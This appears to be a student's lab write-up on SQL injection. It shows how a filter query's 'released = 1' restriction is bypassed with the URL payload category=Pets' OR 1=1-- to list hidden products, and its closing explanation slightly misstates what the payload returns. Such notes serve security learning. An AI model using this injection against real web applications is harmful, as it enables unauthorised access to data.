# Retriveral of Hidden data

normal query when a category is asked to retrive the data 

```
select * from products where category =  'GIFTS' and released = 1
```
the released=1 is restriction to hide the unreleased data 

end goal : to display all the unreleased and released products

```
select * from products where category =  'pets' and released = 1
```

this query returns all the released data from category PETS

Now lets make payload

```
-> select * from products where category =  'Pets' OR 1=1 --' and released = 1

execution
-> url = /filter?category=Pets' OR 1=1--
```

<p>'--' will comment out the query AND RELEASED = 1 and 1=1 is always true, so this will return all the unreleased data from Pets category</p>

